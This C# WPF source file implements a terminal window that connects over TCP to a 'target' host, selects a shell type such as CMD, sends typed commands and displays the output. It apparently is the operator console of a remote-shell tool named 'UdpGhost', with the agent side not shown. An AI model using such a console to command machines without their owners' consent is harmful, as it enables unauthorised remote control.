using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Input;

namespace UdpGhost
{
    public partial class TerminalWindow : Window
    {
        private TcpClient _client;
        private NetworkStream _stream;
        private Thread _recvThread;
        private volatile bool _connected;
        private string _targetIp;
        private int _port;
        private string _shellType;

        public TerminalWindow(string targetIp, int port, string machineName, string shellType = "CMD")
        {
            InitializeComponent();
            _targetIp = targetIp;
            _port = port;
            _shellType = shellType;
            TitleText.Text = "▓ 虚拟控制台 [" + shellType + "] // " + machineName + " (" + targetIp + ")";
            Loaded += TerminalWindow_Loaded;
        }

        private void TerminalWindow_Loaded(object sender, RoutedEventArgs e)
        {
            Connect();
        }

        private void TitleBar_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed) this.DragMove();
        }

        private void Connect()
        {
            try
            {
                _client = new TcpClient();
                _client.Connect(_targetIp, _port);
                _stream = _client.GetStream();

                // 发送shell类型
                byte[] typeData = Encoding.UTF8.GetBytes(_shellType + "\r\n");
                _stream.Write(typeData, 0, typeData.Length);
                _stream.Flush();

                _connected = true;
                AppendOutput("[已连接到 " + _targetIp + ":" + _port + " / " + _shellType + "]\r\n");

                _recvThread = new Thread(RecvLoop) { IsBackground = true };
                _recvThread.Start();

                InputBox.Focus();
            }
            catch (Exception ex)
            {
                AppendOutput("[连接失败: " + ex.Message + "]\r\n");
            }
        }

        private void RecvLoop()
        {
            try
            {
                byte[] buffer = new byte[8192];
                while (_connected && _client.Connected)
                {
                    int read = _stream.Read(buffer, 0, buffer.Length);
                    if (read <= 0) break;
                    string text = Encoding.UTF8.GetString(buffer, 0, read);
                    Dispatcher.Invoke(() => AppendOutput(text));
                }
            }
            catch { }
            finally
            {
                _connected = false;
                Dispatcher.Invoke(() =>
                {
                    AppendOutput("\r\n[连接已断开]\r\n");
                    InputBox.IsEnabled = false;
                });
            }
        }

        private void AppendOutput(string text)
        {
            OutputBox.AppendText(text);
            OutputBox.ScrollToEnd();
        }

        private void Send_Click(object sender, RoutedEventArgs e)
        {
            SendCommand();
        }

        private void InputBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                SendCommand();
                e.Handled = true;
            }
        }

        private void SendCommand()
        {
            if (!_connected || _stream == null) return;
            string cmd = InputBox.Text;
            if (string.IsNullOrEmpty(cmd)) return;

            try
            {
                byte[] data = Encoding.UTF8.GetBytes(cmd + "\r\n");
                _stream.Write(data, 0, data.Length);
                _stream.Flush();
                InputBox.Clear();
            }
            catch (Exception ex)
            {
                AppendOutput("[发送失败: " + ex.Message + "]\r\n");
            }
        }

        private void Close_Click(object sender, RoutedEventArgs e)
        {
            _connected = false;
            try { _stream?.Close(); } catch { }
            try { _client?.Close(); } catch { }
            this.Close();
        }
    }
}
